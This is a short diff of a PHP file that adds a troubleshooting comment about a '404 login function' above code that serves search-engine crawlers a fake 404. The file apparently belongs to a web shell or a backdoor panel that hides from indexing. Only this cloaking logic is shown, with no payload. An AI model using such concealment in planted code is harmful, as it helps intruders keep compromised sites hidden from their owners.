@@ -1,4 +1,9 @@
 <?php
+
+// 500 ERROR? BLANK? DELETE THE 404 LOGIN FUNCTION
+
+
+
 /* Reject search engines */
 if(!empty($_SERVER['HTTP_USER_AGENT'])){if(preg_match('/Google|Slurp|MSNBot|ia_archiver|Yandex|Rambler/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
 
